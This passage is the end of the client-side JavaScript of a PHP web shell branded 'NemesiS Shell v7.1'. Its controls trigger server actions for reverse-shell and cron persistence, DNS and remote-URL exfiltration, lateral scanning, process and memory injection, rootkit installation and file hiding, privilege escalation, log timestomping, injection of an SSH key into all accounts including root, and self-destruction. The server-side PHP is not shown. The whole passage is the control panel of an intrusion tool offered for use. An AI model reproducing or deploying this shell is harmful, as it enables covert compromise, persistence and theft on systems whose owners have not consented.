                toast('Data CVE ditemukan', 'ok');
            } catch (e) {
                res.textContent = 'Error: ' + e.message;
                res.style.color = 'var(--d)';
            }
        }
        async function doCVES(){const kw=document.getElementById('cve-kw').value.trim();if(!kw){toast('Enter keyword','err');return;}const yr=document.getElementById('cve-yr').value;const sv=document.getElementById('cve-sv').value;const res=document.getElementById('cve-s-r');res.innerHTML=`<span style="color:var(--dim)">⟳ Searching "${kw}"...</span>`;try{const r=await post({action:'cve_search',keyword:kw,year:yr,severity:sv});if(!r.ok){res.textContent=r.out||'Error';res.style.color='var(--d)';return;}res.style.color='';res.innerHTML=`<pre style="white-space:pre-wrap;font-family:inherit">${cveSevHTML(r.out)}</pre>`;toast('Search done','ok');}catch(e){res.textContent='Error: '+e.message;res.style.color='var(--d)';}}
        async function doCVER(){const res=document.getElementById('cve-r-r');res.innerHTML='<span style="color:var(--dim)">⟳ Loading latest CVEs...</span>';try{const r=await post({action:'cve_recent'});if(!r.ok){res.textContent=r.out||'Error';res.style.color='var(--d)';return;}res.style.color='';res.innerHTML=`<pre style="white-space:pre-wrap;font-family:inherit">${cveSevHTML(r.out)}</pre>`;toast('Latest CVEs loaded!','ok');}catch(e){res.textContent='Error: '+e.message;res.style.color='var(--d)';}}
        async function loadLog(){const r=await post({action:'get_log'});const log=r.log||[];document.getElementById('alog').innerHTML=log.length?[...log].reverse().map(l=>`<div class="alog-r"><span class="alog-t">${esc(l.time)}</span><span class="alog-u">${esc(l.user)}</span><span class="alog-a">${esc(l.action)}</span><span class="alog-ip">${esc(l.ip||'')}</span></div>`).join(''):'<div style="color:var(--dim)">Log empty.</div>';}
        async function chgPass(){const old=document.getElementById('cp-o').value,nw=document.getElementById('cp-n').value;const r=await post({action:'change_pass',old,new:nw});toast(r.msg,r.ok?'ok':'err');if(r.ok){document.getElementById('cp-o').value='';document.getElementById('cp-n').value='';}}
        function fmGoto(){
            const input=document.getElementById('fm-goto-input');
            let path=input.value.trim();
            if(!path) return;
            if(path.startsWith('~')) path = path.replace('~', '/home/' + LUSER);
            if(!path.startsWith('/')) path = fmDir + '/' + path;
            path = path.replace(/\/+/g,'/');
            fmLoad(path);
            input.value = '';
            buildTree();
        }

        // Advanced Functions
        async function advAct(action, data={}) {
            const fd = new FormData();
            fd.append('action', action);
            fd.append('csrf', CSRF);
            for(const [k,v] of Object.entries(data)) fd.append(k, v);
            const r = await fetch(location.href, {method:'POST', body:fd});
            return await r.json();
        }

        async function advEncrypt() {
            const msg = document.getElementById('adv-msg').value || 'message';
            const r = await advAct('adv_stealth_encrypt', {msg});
            document.getElementById('adv-stealth-out').textContent = JSON.stringify(r, null, 2).substring(0, 500);
        }

        async function advReverse() {
            const ip = document.getElementById('adv-rip').value;
            const port = document.getElementById('adv-rport').value;
            const r = await advAct('adv_persist_reverse', {ip, port});
            document.getElementById('adv-persist-out').textContent = JSON.stringify(r, null, 2);
        }

        async function advCron() {
            const cmd = document.getElementById('adv-ccmd').value;
            const schedule = document.getElementById('adv-csch').value;
            const r = await advAct('adv_persist_cron', {cmd, schedule});
            document.getElementById('adv-persist-out').textContent = JSON.stringify(r, null, 2);
        }

        async function advDeadrop() {
            const url = document.getElementById('adv-durl').value;
            const r = await advAct('adv_persist_deadrop', {url});
            document.getElementById('adv-persist-out').textContent = JSON.stringify(r, null, 2);
        }

        async function advDNS() {
            const data = document.getElementById('adv-dnsd').value;
            const r = await advAct('adv_resilience_dns', {data});
            document.getElementById('adv-resilience-out').textContent = JSON.stringify(r, null, 2);
        }

        async function advFragment() {
            const data = document.getElementById('adv-fragd').value;
            const size = document.getElementById('adv-fragsz').value;
            const r = await advAct('adv_resilience_fragment', {data, size});
            document.getElementById('adv-resilience-out').textContent = JSON.stringify(r, null, 2);
        }

        async function advScan() {
            const network = document.getElementById('adv-snet').value;
            const r = await advAct('adv_lateral_scan', {network});
            document.getElementById('adv-lateral-out').textContent = JSON.stringify(r, null, 2).substring(0, 500);
        }

        async function advCleanFile() {
            const file = document.getElementById('adv-cf').value;
            const r = await advAct('adv_cleanup_file', {file});
            document.getElementById('adv-cleanup-out').textContent = JSON.stringify(r, null, 2);
        }

        // System Monitoring
        async function doSysmon() {
            const out = document.getElementById('sysmon-out');
            out.textContent = 'Loading system stats...';
            try {
                const r = await advAct('sysmon');
                if(r.ok) out.textContent = r.raw || 'No data';
                else out.textContent = JSON.stringify(r);
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // Cloud Sync
        async function doSyncCloud() {
            const paths = document.getElementById('sync-paths').value;
            const url = document.getElementById('sync-url').value.trim();
            if(!url) { toast('Enter remote URL','err'); return; }
            const out = document.getElementById('sync-out');
            out.textContent = 'Uploading...';
            try {
                const r = await advAct('sync_to_cloud', {paths, remote_url: url});
                out.textContent = (r.results || []).join('\n') || JSON.stringify(r);
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // Process Injection
        async function doProcessInject() {
            const pid = document.getElementById('inj-pid').value;
            const cmd = document.getElementById('inj-cmd').value;
            if(!pid) { toast('Enter PID','err'); return; }
            const out = document.getElementById('inj-out');
            out.textContent = 'Injecting...';
            try {
                const r = await advAct('process_inject', {pid, cmd});
                out.textContent = r.output || JSON.stringify(r);
                if(r.ok) toast('Injected!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // Self Destruct
        async function doSelfDestruct() {
            if(!confirm('NUKE AND DELETE? All logs + shell file will be gone!')) return;
            const out = document.getElementById('sd-out');
            out.textContent = 'Detonating...';
            try {
                const r = await advAct('self_destruct');
                out.textContent = r.msg || 'Done';
                toast('Self-destruct triggered!','err');
                setTimeout(() => { location.href = '?logout=1'; }, 1500);
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // Rootkit
        async function doRootkitInstall() {
            const out = document.getElementById('rk-out');
            out.textContent = 'Installing rootkit...';
            try {
                const r = await advAct('rootkit_install');
                out.textContent = (r.methods || []).map(m => '✓ ' + m).join('\n') || JSON.stringify(r);
                toast('Rootkit installed!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        async function doRootkitHideFile() {
            const path = document.getElementById('rk-path').value.trim();
            if(!path) { toast('Enter path','err'); return; }
            const out = document.getElementById('rk-out');
            out.textContent = 'Hiding...';
            try {
                const r = await advAct('rootkit_hide_file', {path});
                out.textContent = r.msg || JSON.stringify(r);
                if(r.ok) toast('File hidden!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        async function doRootkitKill() {
            const proc = document.getElementById('rk-kill').value.trim();
            if(!proc) { toast('Enter process name','err'); return; }
            const out = document.getElementById('rk-out');
            out.textContent = 'Killing...';
            try {
                const r = await advAct('rootkit_kill', {proc});
                out.textContent = r.msg || JSON.stringify(r);
                toast('Kill command sent','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: Auto Privesc ======================
        async function doPrivesc() {
            const out = document.getElementById('privesc-out');
            out.textContent = 'Scanning privilege escalation vectors...';
            try {
                const r = await advAct('auto_privesc');
                out.textContent = r.out || 'Done';
                toast('Privesc scan complete','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: Watchdog ==========================
        async function doWatchdog() {
            const out = document.getElementById('watchdog-out');
            out.textContent = 'Installing watchdog...';
            try {
                const r = await advAct('persist_watchdog');
                out.textContent = r.msg || 'Done';
                toast('Watchdog installed!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: Memory Payload ====================
        async function doMemoryPayload() {
            const payload = document.getElementById('mem-payload').value.trim();
            const cmd = document.getElementById('mem-cmd').value.trim();
            const out = document.getElementById('mem-out');
            if(!payload && !cmd) { toast('Fill payload or command','err'); return; }
            out.textContent = 'Injecting into memory...';
            try {
                const r = await advAct('memory_payload', {payload, cmd});
                out.textContent = r.msg || JSON.stringify(r);
                if(r.ok) toast('Memory payload injected!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: Self-Obfuscator ===================
        async function doObfuscate() {
            const out = document.getElementById('obf-out');
            if(!confirm('Obfuscate this shell? File .obf will be created in same directory.')) return;
            out.textContent = 'Obfuscating...';
            try {
                const r = await advAct('obfuscate_self');
                out.textContent = r.msg || JSON.stringify(r);
                if(r.ok) toast('Obfuscated! Check .obf file','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: Log Timestomp =====================
        async function doTimestomp() {
            const log = document.getElementById('ts-log').value.trim();
            const ref = document.getElementById('ts-ref').value.trim();
            if(!log) { toast('Enter log file path','err'); return; }
            const out = document.getElementById('ts-out');
            out.textContent = 'Stomping...';
            try {
                const r = await advAct('log_timestomp', {file: log, ref});
                out.textContent = r.msg || JSON.stringify(r);
                if(r.ok) toast('Timestamp stomped!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // =================== UPGRADE: SSH Key Inject ====================
        async function doSSHInject() {
            const pubkey = document.getElementById('ssh-key').value.trim();
            if(!pubkey || !pubkey.startsWith('ssh-')) {
                toast('Public key must start with ssh-rsa, ssh-ed25519, etc.','err');
                return;
            }
            if(!confirm('Inject SSH key into all users + root?')) return;
            const out = document.getElementById('ssh-out');
            out.textContent = 'Injecting...';
            try {
                const r = await advAct('ssh_key_inject', {pubkey});
                out.textContent = r.msg || JSON.stringify(r);
                if(r.ok) toast('SSH key injected!','ok');
            } catch(e) { out.textContent = 'Error: ' + e.message; }
        }

        // Idle warning
        let idleT;function resetIdle(){clearTimeout(idleT);idleT=setTimeout(()=>toast('⚠ Session almost timeout!','err'),1500000);}
        document.addEventListener('mousemove',resetIdle);document.addEventListener('keydown',resetIdle);resetIdle();

        // Init
        (async()=>{
            const r=await post({action:'get_history'});if(r.history){P[1].hist=r.history;P[2].hist=[...r.history];}
            updateBC(1,'<?=addslashes($cwd)?>');updateBC(2,'<?=addslashes($cwd)?>');
            const pr=await post({action:'get_pins'});renderPins(pr.pins||[]);
        })();

        console.log('[NemesiS v7.1] All modules loaded - by MataKucing');
        </script>
        <div class="author-foot">⚡ NemesiS Shell · crafted by <span>MataKucing</span> ⚡</div>
        </body>
        </html>
